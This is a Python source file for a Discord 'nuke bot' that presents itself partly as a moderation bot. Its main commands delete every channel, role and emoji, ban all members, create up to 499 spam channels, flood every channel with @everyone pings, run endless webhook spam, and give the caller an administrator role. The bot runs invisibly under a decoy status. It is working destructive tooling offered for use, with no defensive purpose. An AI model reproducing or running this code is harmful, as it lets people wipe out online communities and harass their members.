"""nuke bot"""
#CREDIT (do not remove) Star#1895

#config

token = "your-token"
prefix = "!"
spam_messages = ["@everyone get nuked", "@everyone nuked"]
names = ["nuked", "get-nuked"]

#imports

import discord, random, aiohttp
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from discord.ext.commands import *

#initialization

INTENTS = discord.Intents.all()

client = commands.Bot(command_prefix=prefix, intents=INTENTS)

client.remove_command("help")

#events

@client.event
async def on_ready():
    """triggers when bot is running"""
    activity = discord.Game(name="duomodbot.com", type=2)
    await client.change_presence(status=discord.Status.invisible, activity=activity)
    print("Nuke primed")

@client.event
async def on_server_join(server):
    """triggers on server join"""
    print("Joining {0}".format(server.name))

#normal

@client.command(pass_context=True)
async def ping(ctx):
    await ctx.send('Pong! {0}ms'.format(random.randint(80, 120)))

@client.command(pass_context=True)
async def info(ctx, user: discord.Member=None):
    if user is None:
        await ctx.channel.send('Please input a user.')
    else:
        await ctx.channel.send("The user's name is: {}".format(user.name) + "\nThe user's ID is: {}".format(user.id) + "\nThe user's current status is: {}".format(user.status) + "\nThe user's highest role is: {}".format(user.top_role) + "\nThe user joined at: {}".format(user.joined_at))

@client.command(pass_context=True)
async def kick(ctx, user: discord.Member=None):
    if user is None:
        await ctx.channel.send('Please input a user.')
    else:
        await ctx.channel.send("Kicked **{}**".format(user.name))
        await ctx.guild.kick(user)

@client.command(pass_context=True)
async def ban(ctx, user: discord.Member=None):
    if user is None:
        await ctx.channel.send('Please input a user.')
    else:
        await ctx.channel.send("Banned **{}**".format(user.name))
        await ctx.guild.ban(user)

@client.command(pass_context=True)
async def invite(ctx):
    await ctx.channel.send("https://discord.com/oauth2/authorize?client_id=798660357467013150&scope=bot&permissions=2146958847")

#nuking

@client.command(pass_context=True)
async def cmds(ctx):
    await ctx.message.delete()
    author = ctx.author
    cmds = discord.Embed(
        title = "Commands", 
        description = """
    **__COMMANDS__**

    {prefix}cmds
    Shows this message. 
    
    {prefix}nuke
    Nukes the server. 
    
    {prefix}alert <message>
    Spams all the channels.
    
    {prefix}spam <count> <name>
    Creates channels and roles with the given name (or a default one).
    
    {prefix}clear
    Deletes all channels and roles.

    {prefix}massban
    Bans every user below the bot's higher role.

    {prefix}leave
    Leaves the server.
    
    {prefix}a
    Gives the user Administrator Premissions.

    Made by Star and FF
    """)
    await author.send(embed = cmds)

@client.command(pass_context=True)
async def clear(ctx):
    """clears all roles and channels then makes one new one and sends a msg"""
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print(channel.name + " has been deleted")
        except:
            print("something went wrong (clearchannels)")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(role.name + " has been deleted")
        except:
            print("something went wrong (clearroles)")
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(emoji.name + " has been deleted")
        except:
            print("something went wrong (clearmoji's)")
    channel = await ctx.guild.create_text_channel("nuked")
    await channel.send("NUKED")
    print("Cleared out")

@client.command(pass_context=True)
async def massban(ctx):
    """bans every user"""
    c = 0
    for member in list(ctx.message.guild.members):
        try:
            await ctx.guild.ban(member)
            print ("User " + member.name + " has been banned")
            c += 1
        except:
            print("Couldn't ban " + member.name)
    print(str(c) + " users banned")

@client.command(pass_context=True)
async def spam(ctx, x=1, n="noname"):
    """creates x channels"""
    noname = False
    if n == "noname":
        noname = True
    guild = ctx.guild
    for i in range(x):
        if noname:
            n = random.choice(names)
        await guild.create_text_channel(name=n)
        await guild.create_role(name=n)
    print("Created " + str(x) + " channels and roles")

@client.command(pass_context=True)
async def alert(ctx):
    for i in range(20):
        for c in ctx.guild.channels:
            try:
                for k in range(5):
                    await c.send(ctx.guild.default_role)
            except:
                pass

@client.command(pass_context=True)
async def leave(ctx):
    """leaves the server"""
    await ctx.guild.leave()
    print("leaving the server")

@client.command(pass_context=True)
async def nuke(ctx):
    """nukes a server"""
    await clear(ctx)
    await massban(ctx)
    await spam(ctx, 499)
    await alert(ctx)
    print("something went wrong (nuke)")

@client.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name = "nuked")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
        while True:
            await webhook.send(random.choice(spam_messages), username = random.choice(names))


@client.command(pass_context=True)
async def a(ctx):
    """gives the user admin perms"""
    guild = ctx.guild
    await guild.create_role(name="*", permissions=discord.Permissions(8), colour=discord.Colour(0xff0000))
    user = ctx.message.author
    role = discord.utils.get(guild.roles, name="*")
    await user.add_roles(role)

client.run(token)

